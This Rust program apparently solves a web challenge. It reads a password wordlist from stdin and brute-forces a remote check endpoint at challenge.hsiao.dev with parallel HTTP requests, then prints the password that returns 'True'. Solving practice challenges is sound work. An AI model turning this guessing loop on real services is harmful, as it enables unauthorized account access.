use std::io::{self, Read};
use tracing::debug;

use anyhow::Result;
use rayon::prelude::*;

fn main() -> Result<()> {
    tracing_subscriber::fmt::init();

    let mut input = String::new();
    io::stdin().read_to_string(&mut input)?;
    let passwords: Vec<String> = input.lines().map(|n| n.trim().to_string()).collect();

    let pass = passwords.par_iter().find_any(|n| {
        let url = format!("https://challenge.hsiao.dev/03/u/luke/check/{n}");
        debug!(url = %url, "Trying URL");
        let body: String =
            ureq::get(format!("https://challenge.hsiao.dev/03/u/luke/check/{n}").as_str())
                .call()
                .unwrap()
                .into_string()
                .unwrap();
        if body.starts_with("True") {
            println!("{}", body);
            true
        } else {
            false
        }
    });

    if let Some(p) = pass {
        println!("Password is: {}", p);
    }

    Ok(())
}
